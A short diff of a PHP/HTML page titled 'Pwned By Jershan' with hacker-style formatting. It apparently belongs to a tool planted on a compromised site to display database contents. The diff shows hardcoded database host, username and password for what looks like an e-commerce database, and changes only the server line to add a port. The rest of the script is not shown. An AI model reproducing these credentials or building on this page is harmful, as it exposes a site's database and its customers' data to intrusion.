@@ -1,6 +1,6 @@
 <!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>-=[ Pwned By Jershan ]=-</title>    <style>    body {font-family:monospace; background-color:#000; color:#0f0; margin:0; padding:20px;}    h2 {color:#fff; border-bottom:1px solid #0f0; padding-bottom:5px;}    table {border-collapse:collapse; width:100%; margin-bottom:20px;}    th, td {padding:8px; border:1px solid #0f0;}    th {background-color:#222; color:#0f0;}    tr:nth-child(even) {background-color:#111;}    tr:nth-child(odd) {background-color:#222;}    </style></head><body>
 <?php
-$servername = "127.0.0.1";
+$servername = "127.0.0.1:3306";
 $username = "u510162695_root";
 $password = "u510162695_root";
 $dbname = "u510162695_ecommc";
